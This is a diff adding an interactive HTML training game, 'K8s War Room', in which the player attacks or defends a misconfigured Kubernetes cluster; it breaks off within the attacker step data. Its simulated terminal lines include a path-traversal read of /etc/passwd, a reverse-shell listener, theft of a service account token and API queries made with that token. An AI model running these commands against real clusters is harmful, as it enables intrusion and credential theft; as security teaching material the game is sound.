@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>K8s War Room — Attacker vs Defender</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden;font-family:'Rajdhani',sans-serif}
+
+:root{
+  --atk-bg:#0a0005;--atk-primary:#ff1a3c;--atk-dim:#3d000f;--atk-glow:rgba(255,26,60,0.4);
+  --atk-text:#ff6680;--atk-card:#150008;--atk-border:#3d0015;
+  --def-bg:#00050f;--def-primary:#00d4ff;--def-dim:#003d4d;--def-glow:rgba(0,212,255,0.4);
+  --def-text:#80e8ff;--def-card:#001520;--def-border:#003d5c;
+  --neutral:#1a1a2e;--white:#f0f8ff;--muted:#6a7a8a;
+}
+
+body{background:#050510;color:var(--white);cursor:default}
+
+/* ═══════════════════════ ROLE SELECT ═══════════════════════ */
+#role-select{
+  position:fixed;inset:0;z-index:100;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  background:#050510;
+  transition:opacity 0.6s,transform 0.6s;
+}
+#role-select.exit{opacity:0;transform:scale(1.05);pointer-events:none}
+
+.rs-title{
+  font-family:'Orbitron',monospace;font-size:clamp(1.2rem,3vw,2rem);
+  font-weight:900;letter-spacing:0.15em;color:var(--white);
+  margin-bottom:0.5rem;text-align:center;
+}
+.rs-sub{
+  font-family:'Share Tech Mono',monospace;font-size:0.85rem;
+  color:var(--muted);margin-bottom:3rem;letter-spacing:0.05em;text-align:center;
+}
+.rs-cards{display:flex;gap:2rem;flex-wrap:wrap;justify-content:center;padding:0 1rem}
+
+.rs-card{
+  width:320px;border:1px solid;border-radius:4px;overflow:hidden;
+  cursor:pointer;transition:all 0.35s;position:relative;
+  transform:translateY(0);
+}
+.rs-card:hover{transform:translateY(-8px) scale(1.02)}
+.rs-card.atk{border-color:var(--atk-border);background:var(--atk-card)}
+.rs-card.atk:hover{border-color:var(--atk-primary);box-shadow:0 0 40px var(--atk-glow),0 20px 40px rgba(0,0,0,0.5)}
+.rs-card.def{border-color:var(--def-border);background:var(--def-card)}
+.rs-card.def:hover{border-color:var(--def-primary);box-shadow:0 0 40px var(--def-glow),0 20px 40px rgba(0,0,0,0.5)}
+
+.rs-card-top{padding:2rem 1.5rem 1.5rem;text-align:center}
+.rs-icon{font-size:4rem;margin-bottom:1rem;display:block;animation:float 3s ease-in-out infinite}
+.rs-card.atk .rs-icon{animation-delay:0s}
+.rs-card.def .rs-icon{animation-delay:1.5s}
+.rs-role{font-family:'Orbitron',monospace;font-size:1.4rem;font-weight:900;margin-bottom:0.4rem}
+.rs-card.atk .rs-role{color:var(--atk-primary)}
+.rs-card.def .rs-role{color:var(--def-primary)}
+.rs-tagline{font-size:0.9rem;color:var(--muted);line-height:1.5}
+.rs-card-bottom{
+  padding:1rem 1.5rem;border-top:1px solid;
+  font-family:'Share Tech Mono',monospace;font-size:0.72rem;line-height:1.8;
+}
+.rs-card.atk .rs-card-bottom{border-color:var(--atk-border);color:var(--atk-text)}
+.rs-card.def .rs-card-bottom{border-color:var(--def-border);color:var(--def-text)}
+.rs-btn{
+  display:block;width:100%;padding:0.9rem;margin-top:1.2rem;
+  font-family:'Orbitron',monospace;font-size:0.8rem;font-weight:700;
+  letter-spacing:0.1em;border:none;cursor:pointer;border-radius:2px;
+  transition:all 0.2s;
+}
+.rs-card.atk .rs-btn{background:var(--atk-primary);color:#000}
+.rs-card.atk .rs-btn:hover{background:#ff3355;box-shadow:0 0 20px var(--atk-glow)}
+.rs-card.def .rs-btn{background:var(--def-primary);color:#000}
+.rs-card.def .rs-btn:hover{background:#33ddff;box-shadow:0 0 20px var(--def-glow)}
+
+/* ═══════════════════════ MAIN APP ═══════════════════════ */
+#app{position:fixed;inset:0;display:none;flex-direction:column;overflow:hidden}
+#app.visible{display:flex}
+
+/* TOP BAR */
+.topbar{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 1.5rem;height:52px;border-bottom:1px solid;flex-shrink:0;
+  position:relative;z-index:10;
+}
+.app-atk .topbar{background:rgba(10,0,5,0.95);border-color:var(--atk-border)}
+.app-def .topbar{background:rgba(0,5,15,0.95);border-color:var(--def-border)}
+.tb-left{display:flex;align-items:center;gap:1rem}
+.tb-mode{
+  font-family:'Orbitron',monospace;font-size:0.75rem;font-weight:700;
+  padding:0.3rem 0.9rem;border-radius:2px;letter-spacing:0.1em;
+}
+.app-atk .tb-mode{background:var(--atk-dim);color:var(--atk-primary);border:1px solid var(--atk-primary)}
+.app-def .tb-mode{background:var(--def-dim);color:var(--def-primary);border:1px solid var(--def-primary)}
+.tb-title{font-family:'Share Tech Mono',monospace;font-size:0.8rem;color:var(--muted)}
+.tb-switch{
+  font-family:'Share Tech Mono',monospace;font-size:0.72rem;
+  padding:0.35rem 0.9rem;border-radius:2px;cursor:pointer;
+  background:transparent;transition:all 0.2s;
+}
+.app-atk .tb-switch{color:var(--def-primary);border:1px solid var(--def-border)}
+.app-atk .tb-switch:hover{background:rgba(0,212,255,0.08);border-color:var(--def-primary)}
+.app-def .tb-switch{color:var(--atk-primary);border:1px solid var(--atk-border)}
+.app-def .tb-switch:hover{background:rgba(255,26,60,0.08);border-color:var(--atk-primary)}
+
+/* PROGRESS BAR */
+.progress-track{
+  height:3px;background:rgba(255,255,255,0.05);flex-shrink:0;position:relative;
+}
+.progress-fill{height:100%;transition:width 0.5s ease,background 0.3s;width:0%}
+.app-atk .progress-fill{background:var(--atk-primary)}
+.app-def .progress-fill{background:var(--def-primary)}
+
+/* MAIN LAYOUT */
+.main-layout{flex:1;display:grid;grid-template-columns:1fr 380px;overflow:hidden;min-height:0}
+@media(max-width:900px){.main-layout{grid-template-columns:1fr}}
+
+/* CLUSTER CANVAS */
+.cluster-canvas{
+  position:relative;overflow:hidden;
+  display:flex;align-items:center;justify-content:center;
+}
+.app-atk .cluster-canvas{background:var(--atk-bg)}
+.app-def .cluster-canvas{background:var(--def-bg)}
+
+/* Grid overlay */
+.cluster-canvas::before{
+  content:'';position:absolute;inset:0;pointer-events:none;
+  background-image:linear-gradient(rgba(255,255,255,0.025) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,0.025) 1px,transparent 1px);
+  background-size:32px 32px;
+}
+
+/* SVG cluster diagram */
+#cluster-svg{width:100%;height:100%;max-width:600px;max-height:500px}
+
+/* NODE BOXES */
+.c-node{
+  rx:4;cursor:pointer;transition:all 0.3s;
+}
+.node-label{font-family:'Share Tech Mono',monospace;font-size:11px;fill:#6a7a8a}
+.node-title{font-family:'Orbitron',monospace;font-size:9px;font-weight:700}
+.node-status{font-family:'Share Tech Mono',monospace;font-size:8px}
+
+/* STEP PANEL */
+.step-panel{
+  display:flex;flex-direction:column;overflow:hidden;border-left:1px solid;
+}
+.app-atk .step-panel{background:var(--atk-card);border-color:var(--atk-border)}
+.app-def .step-panel{background:var(--def-card);border-color:var(--def-border)}
+
+.sp-header{
+  padding:1rem 1.2rem 0.8rem;border-bottom:1px solid;flex-shrink:0;
+}
+.app-atk .sp-header{border-color:var(--atk-border)}
+.app-def .sp-header{border-color:var(--def-border)}
+.sp-step-num{
+  font-family:'Share Tech Mono',monospace;font-size:0.68rem;
+  margin-bottom:0.3rem;letter-spacing:0.1em;
+}
+.app-atk .sp-step-num{color:var(--atk-primary)}
+.app-def .sp-step-num{color:var(--def-primary)}
+.sp-title{font-family:'Orbitron',monospace;font-size:0.95rem;font-weight:700;line-height:1.3;margin-bottom:0.5rem}
+.sp-desc{font-size:0.82rem;color:rgba(240,248,255,0.7);line-height:1.6}
+
+.sp-terminal{
+  flex:1;overflow-y:auto;padding:0.75rem 1rem;
+  font-family:'Share Tech Mono',monospace;font-size:0.7rem;line-height:1.9;
+  background:#020408;
+}
+.t-prompt{color:#ffd32a}
+.t-cmd{color:#e0e0e0}
+.t-out-bad{color:#ff6680}
+.t-out-good{color:#60ff9a}
+.t-out-info{color:#80d0ff}
+.t-out-muted{color:#4a6a7a}
+.t-blink::after{content:'▋';animation:blink 1s step-end infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+.sp-actions{padding:0.8rem 1rem;border-top:1px solid;flex-shrink:0;display:flex;gap:0.5rem;flex-wrap:wrap}
+.app-atk .sp-actions{border-color:var(--atk-border)}
+.app-def .sp-actions{border-color:var(--def-border)}
+.act-btn{
+  flex:1;min-width:110px;padding:0.6rem 0.8rem;
+  font-family:'Share Tech Mono',monospace;font-size:0.72rem;
+  border-radius:2px;cursor:pointer;transition:all 0.2s;border:1px solid;
+  letter-spacing:0.03em;
+}
+.app-atk .act-btn.primary{background:var(--atk-primary);color:#000;border-color:var(--atk-primary)}
+.app-atk .act-btn.primary:hover{background:#ff3355;box-shadow:0 0 12px var(--atk-glow)}
+.app-atk .act-btn.secondary{background:transparent;color:var(--atk-text);border-color:var(--atk-border)}
+.app-atk .act-btn.secondary:hover{border-color:var(--atk-primary);background:rgba(255,26,60,0.08)}
+.app-def .act-btn.primary{background:var(--def-primary);color:#000;border-color:var(--def-primary)}
+.app-def .act-btn.primary:hover{background:#33ddff;box-shadow:0 0 12px var(--def-glow)}
+.app-def .act-btn.secondary{background:transparent;color:var(--def-text);border-color:var(--def-border)}
+.app-def .act-btn.secondary:hover{border-color:var(--def-primary);background:rgba(0,212,255,0.08)}
+
+/* ALERT BANNER */
+.alert-banner{
+  padding:0.6rem 1.2rem;text-align:center;
+  font-family:'Share Tech Mono',monospace;font-size:0.75rem;
+  letter-spacing:0.05em;display:none;flex-shrink:0;
+  animation:flash 0.5s ease;
+}
+.alert-banner.show{display:block}
+.app-atk .alert-banner{background:rgba(255,26,60,0.15);color:var(--atk-primary);border-bottom:1px solid var(--atk-border)}
+.app-def .alert-banner{background:rgba(0,212,255,0.1);color:var(--def-primary);border-bottom:1px solid var(--def-border)}
+@keyframes flash{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+
+/* DAMAGE / SCORE */
+.score-area{
+  display:flex;gap:1rem;padding:0 1.2rem 0.6rem;flex-shrink:0;
+}
+.score-box{flex:1;background:rgba(0,0,0,0.3);border-radius:2px;padding:0.4rem 0.6rem;border:1px solid rgba(255,255,255,0.05)}
+.sb-label{font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;margin-bottom:0.2rem}
+.sb-val{font-family:'Orbitron',monospace;font-size:1rem;font-weight:700}
+.app-atk .sb-val{color:var(--atk-primary)}
+.app-def .sb-val{color:var(--def-primary)}
+
+/* ═══ PARTICLE CANVAS ═══ */
+#particle-canvas{position:absolute;inset:0;pointer-events:none;z-index:2}
+
+/* ═══ ANIMATIONS ═══ */
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+@keyframes pulse-atk{0%,100%{filter:drop-shadow(0 0 6px var(--atk-glow))}50%{filter:drop-shadow(0 0 14px var(--atk-glow))}}
+@keyframes pulse-def{0%,100%{filter:drop-shadow(0 0 6px var(--def-glow))}50%{filter:drop-shadow(0 0 14px var(--def-glow))}}
+@keyframes glitch{
+  0%,100%{transform:translate(0)}2%{transform:translate(-2px,1px)}4%{transform:translate(2px,-1px)}
+  6%{transform:translate(-1px,2px)}8%{transform:translate(0)}
+}
+@keyframes shake{
+  0%,100%{transform:translate(0)}10%{transform:translate(-3px,2px)}20%{transform:translate(3px,-2px)}
+  30%{transform:translate(-2px,-1px)}40%{transform:translate(2px,1px)}50%{transform:translate(0)}
+}
+@keyframes pwned{
+  0%{fill:var(--neutral);stroke:#333}50%{fill:#3d000f;stroke:var(--atk-primary)}
+  100%{fill:#200008;stroke:var(--atk-primary)}
+}
+@keyframes defended{
+  0%{fill:var(--neutral)}50%{fill:#001520;stroke:var(--def-primary);stroke-width:2}
+  100%{fill:#001a30;stroke:var(--def-primary);stroke-width:2}
+}
+@keyframes typeIn{from{opacity:0;transform:translateX(-4px)}to{opacity:1;transform:translateX(0)}}
+
+.line-appear{animation:typeIn 0.15s ease both}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.1);border-radius:2px}
+
+/* VICTORY SCREEN */
+#victory{
+  position:fixed;inset:0;z-index:200;display:none;
+  align-items:center;justify-content:center;flex-direction:column;
+  background:rgba(0,0,0,0.92);text-align:center;padding:2rem;
+}
+#victory.show{display:flex}
+.v-icon{font-size:5rem;margin-bottom:1rem;animation:float 2s ease-in-out infinite}
+.v-title{font-family:'Orbitron',monospace;font-size:2rem;font-weight:900;margin-bottom:0.5rem}
+.v-sub{font-family:'Share Tech Mono',monospace;font-size:0.9rem;color:var(--muted);margin-bottom:2rem;max-width:500px;line-height:1.7}
+.v-btns{display:flex;gap:1rem;flex-wrap:wrap;justify-content:center}
+</style>
+</head>
+<body>
+
+<!-- ══════════════ ROLE SELECT ══════════════ -->
+<div id="role-select">
+  <div class="rs-title">K8S WAR ROOM</div>
+  <div class="rs-sub">// choose your side. the cluster is waiting.</div>
+  <div class="rs-cards">
+
+    <div class="rs-card atk" onclick="startMode('atk')">
+      <div class="rs-card-top">
+        <span class="rs-icon">💀</span>
+        <div class="rs-role">ATTACKER</div>
+        <div class="rs-tagline">You found a misconfigured pod.<br/>How far can you go?</div>
+      </div>
+      <div class="rs-card-bottom">
+        ▸ Exploit a privileged container<br/>
+        ▸ Escape to the host node<br/>
+        ▸ Steal the service account token<br/>
+        ▸ Pivot to cluster-admin<br/>
+        ▸ Own the entire cluster
+        <button class="rs-btn">LAUNCH ATTACK →</button>
+      </div>
+    </div>
+
+    <div class="rs-card def" onclick="startMode('def')">
+      <div class="rs-card-top">
+        <span class="rs-icon">🛡️</span>
+        <div class="rs-role">DEFENDER</div>
+        <div class="rs-tagline">The cluster is exposed.<br/>Deploy controls. Reduce blast radius.</div>
+      </div>
+      <div class="rs-card-bottom">
+        ▸ Apply SecurityContext hardening<br/>
+        ▸ Drop all capabilities<br/>
+        ▸ Deploy NetworkPolicy<br/>
+        ▸ Enforce RBAC least-privilege<br/>
+        ▸ Make the cluster bulletproof
+        <button class="rs-btn">DEFEND CLUSTER →</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════ MAIN APP ══════════════ -->
+<div id="app">
+  <div class="topbar">
+    <div class="tb-left">
+      <div class="tb-mode" id="tb-mode">ATTACKER</div>
+      <div class="tb-title" id="tb-title">K8s Cluster Exploitation Chain</div>
+    </div>
+    <button class="tb-switch" id="tb-switch" onclick="switchMode()">⇄ Switch to Defender</button>
+  </div>
+  <div class="progress-track"><div class="progress-fill" id="progress-fill"></div></div>
+  <div class="alert-banner" id="alert-banner"></div>
+
+  <div class="main-layout">
+    <!-- CLUSTER VIZ -->
+    <div class="cluster-canvas">
+      <canvas id="particle-canvas"></canvas>
+      <svg id="cluster-svg" viewBox="0 0 560 460" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <filter id="glow-atk"><feGaussianBlur stdDeviation="3" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          <filter id="glow-def"><feGaussianBlur stdDeviation="3" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          <filter id="glow-strong"><feGaussianBlur stdDeviation="6" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+        </defs>
+
+        <!-- Cluster boundary -->
+        <rect id="cluster-border" x="10" y="10" width="540" height="440" rx="8"
+          fill="none" stroke="#1a2a3a" stroke-width="1.5" stroke-dasharray="6,4"/>
+        <text x="20" y="28" font-family="'Share Tech Mono'" font-size="10" fill="#2a4a5a">KUBERNETES CLUSTER: cis-demo</text>
+
+        <!-- Internet / Attacker -->
+        <rect id="node-internet" x="30" y="50" width="100" height="60" rx="4" fill="#0d0d0d" stroke="#333" stroke-width="1"/>
+        <text x="80" y="76" text-anchor="middle" font-family="'Orbitron'" font-size="9" fill="#888">INTERNET</text>
+        <text x="80" y="92" text-anchor="middle" font-family="'Share Tech Mono'" font-size="10" fill="#ff1a3c" id="attacker-icon">👾 attacker</text>
+
+        <!-- Nginx Pod (target) -->
+        <rect id="node-pod" x="200" y="40" width="140" height="80" rx="4" fill="#111" stroke="#2a3a4a" stroke-width="1.5"/>
+        <text x="270" y="62" text-anchor="middle" font-family="'Orbitron'" font-size="9" fill="#5a8a9a">POD</text>
+        <text x="270" y="78" text-anchor="middle" font-family="'Share Tech Mono'" font-size="9" fill="#6a9aaa">nginx:latest</text>
+        <text id="pod-status" x="270" y="96" text-anchor="middle" font-family="'Share Tech Mono'" font-size="8" fill="#3a5a6a">privileged:true | root</text>
+        <text id="pod-icon" x="270" y="112" text-anchor="middle" font-size="14">📦</text>
+
+        <!-- Host Node -->
+        <rect id="node-host" x="180" y="170" width="180" height="70" rx="4" fill="#0a0a10" stroke="#1a2a3a" stroke-width="1.5"/>
+        <text x="270" y="192" text-anchor="middle" font-family="'Orbitron'" font-size="9" fill="#4a6a7a">HOST NODE</text>
+        <text x="270" y="208" text-anchor="middle" font-family="'Share Tech Mono'" font-size="8" fill="#3a5a6a">minikube / linux kernel</text>
+        <text id="host-icon" x="270" y="228" text-anchor="middle" font-size="13">🖥️</text>
+
+        <!-- Secret / Token -->
+        <rect id="node-secret" x="400" y="50" width="130" height="70" rx="4" fill="#0a0a10" stroke="#1a2a3a" stroke-width="1.5"/>
+        <text x="465" y="72" text-anchor="middle" font-family="'Orbitron'" font-size="9" fill="#4a6a7a">SERVICE ACCOUNT</text>
+        <text x="465" y="88" text-anchor="middle" font-family="'Share Tech Mono'" font-size="8" fill="#3a5a6a">token: /var/run/...</text>
+        <text id="secret-icon" x="465" y="106" text-anchor="middle" font-size="13">🔑</text>
+
+        <!-- API Server -->
+        <rect id="node-api" x="370" y="170" width="150" height="70" rx="4" fill="#0a0a10" stroke="#1a2a3a" stroke-width="1.5"/>
+        <text x="445" y="192" text-anchor="middle" font-family="'Orbitron'" font-size="9" fill="#4a6a7a">API SERVER</text>
+        <text x="445" y="208" text-anchor="middle" font-family="'Share Tech Mono'" font-size="8" fill="#3a5a6a">10.96.0.1:443</text>
+        <text id="api-icon" x="445" y="228" text-anchor="middle" font-size="13">⚙️</text>
+
+        <!-- RBAC / ClusterRole -->
+        <rect id="node-rbac" x="180" y="300" width="160" height="70" rx="4" fill="#0a0a10" stroke="#1a2a3a" stroke-width="1.5"/>
+        <text x="260" y="322" text-anchor="middle" font-family="'Orbitron'" font-size="9" fill="#4a6a7a">RBAC</text>
+        <text x="260" y="338" text-anchor="middle" font-family="'Share Tech Mono'" font-size="8" fill="#3a5a6a">cluster-admin bound</text>
+        <text id="rbac-icon" x="260" y="358" text-anchor="middle" font-size="13">🗝️</text>
+
+        <!-- All Namespaces (final target) -->
+        <rect id="node-cluster" x="370" y="290" width="160" height="80" rx="4" fill="#0a0a10" stroke="#1a2a3a" stroke-width="1.5"/>
+        <text x="450" y="314" text-anchor="middle" font-family="'Orbitron'" font-size="9" fill="#4a6a7a">ALL NAMESPACES</text>
+        <text x="450" y="330" text-anchor="middle" font-family="'Share Tech Mono'" font-size="8" fill="#3a5a6a">secrets, configs, pods</text>
+        <text x="450" y="346" text-anchor="middle" font-family="'Share Tech Mono'" font-size="8" fill="#3a5a6a">deployments, nodes</text>
+        <text id="cluster-icon" x="450" y="362" text-anchor="middle" font-size="13">🌐</text>
+
+        <!-- NetworkPolicy indicator -->
+        <rect id="node-netpol" x="30" y="290" width="120" height="60" rx="4" fill="#0a0a10" stroke="#1a2a3a" stroke-width="1.5"/>
+        <text x="90" y="314" text-anchor="middle" font-family="'Orbitron'" font-size="8" fill="#4a6a7a">NETPOLICY</text>
+        <text id="netpol-status" x="90" y="330" text-anchor="middle" font-family="'Share Tech Mono'" font-size="8" fill="#3a5a6a">none</text>
+        <text id="netpol-icon" x="90" y="344" text-anchor="middle" font-size="11">🚫</text>
+
+        <!-- CONNECTIONS (initially hidden) -->
+        <!-- atk → pod -->
+        <line id="conn-atk-pod" x1="130" y1="80" x2="200" y2="80" stroke="#ff1a3c" stroke-width="0" stroke-dasharray="5,3" opacity="0"/>
+        <!-- pod → host -->
+        <line id="conn-pod-host" x1="270" y1="120" x2="270" y2="170" stroke="#ff1a3c" stroke-width="0" stroke-dasharray="5,3" opacity="0"/>
+        <!-- pod → secret -->
+        <line id="conn-pod-secret" x1="340" y1="75" x2="400" y2="75" stroke="#ff1a3c" stroke-width="0" stroke-dasharray="5,3" opacity="0"/>
+        <!-- secret → api -->
+        <line id="conn-secret-api" x1="445" y1="120" x2="445" y2="170" stroke="#ff1a3c" stroke-width="0" stroke-dasharray="5,3" opacity="0"/>
+        <!-- api → rbac -->
+        <line id="conn-api-rbac" x1="400" y1="205" x2="340" y2="340" stroke="#ff1a3c" stroke-width="0" stroke-dasharray="5,3" opacity="0"/>
+        <!-- rbac → cluster -->
+        <line id="conn-rbac-cluster" x1="340" y1="335" x2="370" y2="335" stroke="#ff1a3c" stroke-width="0" stroke-dasharray="5,3" opacity="0"/>
+
+        <!-- DEF connection lines (shields) -->
+        <line id="def-conn1" x1="270" y1="120" x2="270" y2="170" stroke="#00d4ff" stroke-width="0" opacity="0"/>
+        <line id="def-conn2" x1="340" y1="75" x2="400" y2="75" stroke="#00d4ff" stroke-width="0" opacity="0"/>
+
+        <!-- Shield overlays (defender) -->
+        <text id="shield-pod" x="270" y="152" text-anchor="middle" font-size="20" opacity="0">🛡️</text>
+        <text id="shield-host" x="270" y="260" text-anchor="middle" font-size="20" opacity="0">🛡️</text>
+        <text id="shield-rbac" x="260" y="382" text-anchor="middle" font-size="20" opacity="0">🛡️</text>
+        <text id="shield-secret" x="465" y="130" text-anchor="middle" font-size="20" opacity="0">🛡️</text>
+        <text id="shield-api" x="445" y="252" text-anchor="middle" font-size="20" opacity="0">🛡️</text>
+        <text id="shield-cluster" x="450" y="382" text-anchor="middle" font-size="20" opacity="0">🛡️</text>
+
+        <!-- Pwned overlays -->
+        <text id="pwn-pod" x="330" y="48" font-family="'Share Tech Mono'" font-size="11" fill="#ff1a3c" opacity="0">PWNED</text>
+        <text id="pwn-host" x="310" y="175" font-family="'Share Tech Mono'" font-size="11" fill="#ff1a3c" opacity="0">PWNED</text>
+        <text id="pwn-cluster" x="390" y="295" font-family="'Share Tech Mono'" font-size="11" fill="#ff1a3c" opacity="0">💀 OWNED</text>
+      </svg>
+    </div>
+
+    <!-- STEP PANEL -->
+    <div class="step-panel">
+      <div class="sp-header">
+        <div class="sp-step-num" id="sp-step-num">STEP 1 / 6</div>
+        <div class="sp-title" id="sp-title">Loading...</div>
+        <div class="sp-desc" id="sp-desc"></div>
+      </div>
+      <div class="score-area">
+        <div class="score-box"><div class="sb-label">STAGE</div><div class="sb-val" id="sb-stage">1/6</div></div>
+        <div class="score-box"><div class="sb-label" id="sb-label2">DAMAGE</div><div class="sb-val" id="sb-val2">0%</div></div>
+        <div class="score-box"><div class="sb-label" id="sb-label3">CONTROLS</div><div class="sb-val" id="sb-val3">0/6</div></div>
+      </div>
+      <div class="sp-terminal" id="sp-terminal"></div>
+      <div class="sp-actions" id="sp-actions"></div>
+    </div>
+  </div>
+</div>
+
+<!-- VICTORY -->
+<div id="victory">
+  <div class="v-icon" id="v-icon">💀</div>
+  <div class="v-title" id="v-title">CLUSTER OWNED</div>
+  <div class="v-sub" id="v-sub">You exploited every misconfiguration and gained full cluster-admin access. This is what happens to unprotected Kubernetes workloads.</div>
+  <div class="v-btns">
+    <button class="rs-btn" style="background:var(--atk-primary);color:#000;font-family:'Orbitron',monospace;font-size:0.8rem;padding:0.8rem 1.8rem;border:none;cursor:pointer;border-radius:2px" onclick="switchMode()">Switch to Defender</button>
+    <button class="rs-btn" style="background:transparent;color:var(--muted);border:1px solid #333;font-family:'Share Tech Mono',monospace;font-size:0.78rem;padding:0.8rem 1.8rem;cursor:pointer;border-radius:2px" onclick="restartMode()">Attack Again</button>
+  </div>
+</div>
+
+<script>
+// ════════════════════════════════════════════════════════════
+// DATA
+// ════════════════════════════════════════════════════════════
+
+const ATK_STEPS = [
+  {
+    title: "Reconnaissance",
+    desc: "You've found an exposed nginx service. Port scan reveals it's running on K8s. Let's see what we're dealing with.",
+    lines: [
+      {t:'prompt', text:'nmap -sV target-ip'},
+      {t:'out', text:'80/tcp  open  http  nginx/1.25.3', cls:'t-out-info'},
+      {t:'out', text:'443/tcp open  https nginx/1.25.3', cls:'t-out-info'},
+      {t:'pause',ms:600},
+      {t:'prompt', text:'curl -k https://target/api'},
+      {t:'out', text:'{"kind":"Status","code":403}', cls:'t-out-bad'},
+      {t:'out', text:'# API server reachable! No network restriction.', cls:'t-out-muted'},
+      {t:'pause',ms:400},
+      {t:'out', text:'[!] Target: misconfigured K8s pod', cls:'t-out-bad'},
+      {t:'out', text:'[!] hostNetwork:true — shares host network', cls:'t-out-bad'},
+      {t:'out', text:'[+] Attack surface confirmed. Proceeding...', cls:'t-out-bad'},
+    ],
+    btn: "Exploit Vulnerability →",
+    alert: "⚠ Target acquired — exposed nginx pod detected",
+    svgFn: (step) => {
+      animLine('conn-atk-pod', '#ff1a3c', 1.5);
+      pulseNode('node-internet', 'atk');
+    },
+    damage: 15
+  },
+  {
+    title: "Container Escape via RCE",
+    desc: "nginx has a path traversal vuln. You get RCE inside the container. privileged:true means you can see the host.",
+    lines: [
+      {t:'prompt', text:'curl "https://target/../../../../etc/passwd"'},
+      {t:'out', text:'root:x:0:0:root:/root:/bin/bash', cls:'t-out-bad'},
+      {t:'out', text:'# ← Running as uid=0 (root)! File read confirmed.', cls:'t-out-muted'},
+      {t:'pause', ms:500},
+      {t:'prompt', text:'# Upload reverse shell...'},
+      {t:'prompt', text:'nc -lvp 4444 &'},
+      {t:'out', text:'listening on 0.0.0.0:4444', cls:'t-out-info'},
+      {t:'pause', ms:700},
+      {t:'out', text:'connect from 10.244.0.5:38421', cls:'t-out-bad'},
+      {t:'prompt', text:'id'},
+      {t:'out', text:'uid=0(root) gid=0(root) groups=0(root)', cls:'t-out-bad'},
+      {t:'pause', ms:400},
+      {t:'prompt', text:'cat /proc/1/cmdline | tr "\\0" " "'},
+      {t:'out', text:'/sbin/init', cls:'t-out-bad'},
+      {t:'out', text:'# ← HOST init process! hostPID:true = we see the host!', cls:'t-out-muted'},
+      {t:'out', text:'[+] SHELL ON HOST NODE! Container escape successful.', cls:'t-out-bad'},
+    ],
+    btn: "Grab Service Account Token →",
+    alert: "🔴 CONTAINER ESCAPE — Host node compromised",
+    svgFn: () => {
+      paintNode('node-pod', '#ff1a3c', '#200008');
+      animLine('conn-pod-host', '#ff1a3c', 2);
+      setEl('pwn-pod', 'opacity', '1');
+      pulseNode('node-host', 'atk');
+    },
+    damage: 40
+  },
+  {
+    title: "Steal Service Account Token",
+    desc: "Every pod has a service account token auto-mounted. You just found the keys to the kingdom.",
+    lines: [
+      {t:'prompt', text:'find / -name "token" 2>/dev/null | head -5'},
+      {t:'out', text:'/var/run/secrets/kubernetes.io/serviceaccount/token', cls:'t-out-bad'},
+      {t:'pause', ms:500},
+      {t:'prompt', text:'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'},
+      {t:'prompt', text:'echo $TOKEN | cut -d"." -f2 | base64 -d | python3 -m json.tool'},
+      {t:'out', text:'{', cls:'t-out-info'},
+      {t:'out', text:'  "sub": "system:serviceaccount:cis-demo:non-compliant-sa",', cls:'t-out-bad'},
+      {t:'out', text:'  "kubernetes.io/serviceaccount/service-account.name": "non-compliant-sa"', cls:'t-out-bad'},
+      {t:'out', text:'}', cls:'t-out-info'},
+      {t:'pause', ms:400},
+      {t:'out', text:'[+] Token extracted! ServiceAccount: non-compliant-sa', cls:'t-out-bad'},
+      {t:'out', text:'[+] Namespace: cis-demo', cls:'t-out-bad'},
+    ],
+    btn: "Check RBAC Permissions →",
+    alert: "🔴 SERVICE ACCOUNT TOKEN STOLEN",
+    svgFn: () => {
+      paintNode('node-secret', '#ff1a3c', '#200008');
+      animLine('conn-pod-secret', '#ff1a3c', 1.5);
+      setEl('secret-icon', 'textContent', '💀');
+      pulseNode('node-api', 'atk');
+    },
+    damage: 60
+  },
+  {
+    title: "Discover cluster-admin Binding",
+    desc: "You query the API server with the stolen token. The service account is bound to cluster-admin. Full access.",
+    lines: [
+      {t:'prompt', text:'export APISERVER=https://10.96.0.1'},
+      {t:'prompt', text:'curl -sk $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \\'},
+      {t:'out', text:'  -H "Authorization: Bearer $TOKEN" | jq', cls:'t-cmd'},
+      {t:'pause', ms:600},
+      {t:'out', text:'{', cls:'t-out-info'},
+      {t:'out', text:'  "metadata": { "name": "non-compliant-crb" },', cls:'t-out-info'},
+      {t:'out', text:'  "roleRef": {', cls:'t-out-info'},
+      {t:'out', text:'    "name": "cluster-admin"  ← JACKPOT!', cls:'t-out-bad'},
+      {t:'out', text:'  },', cls:'t-out-info'},
+      {t:'out', text:'  "subjects": [{ "name": "non-compliant-sa" }]', cls:'t-out-bad'},
+      {t:'out', text:'}', cls:'t-out-info'},
+      {t:'pause', ms:400},
+      {t:'out', text:'[+] non-compliant-sa = cluster-admin!', cls:'t-out-bad'},
+      {t:'out', text:'[+] Unrestricted access to EVERY resource.', cls:'t-out-bad'},
+    ],
+    btn: "Enumerate Cluster Secrets →",
